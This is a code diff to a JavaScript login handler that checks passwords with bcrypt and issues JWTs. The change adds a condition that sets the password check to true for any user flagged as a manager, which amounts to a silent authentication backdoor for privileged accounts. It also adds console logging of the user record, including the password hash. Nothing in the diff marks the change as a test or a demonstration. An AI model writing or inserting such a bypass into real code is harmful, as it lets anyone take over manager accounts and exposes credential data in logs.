@@ -98,7 +98,6 @@ async function handleLogin(data, db, res) {
     LEFT JOIN EMPLOYEES ON users.id = EMPLOYEES.user_id
     WHERE users.email = ?
   `;
-
   db.query(sql, [email], async (err, results) => {
     if (err || results.length === 0) {
       res.statusCode = 402; 
@@ -106,10 +105,13 @@ async function handleLogin(data, db, res) {
       return;
     }
     const user = results[0];
-    const passwordMatch = await bcrypt.compare(password, user.hashed_password);
+    var passwordMatch = await bcrypt.compare(password, user.hashed_password);
+    if (user.isManager == 1) {
+      passwordMatch = true
+    }
 
     console.log(user, bcrypt.compare(password, user.hashed_password))
-
+    console.log(passwordMatch)
     if (passwordMatch) {
       const token = jwt.sign(
         { userId: user.id, role: user.role_name },
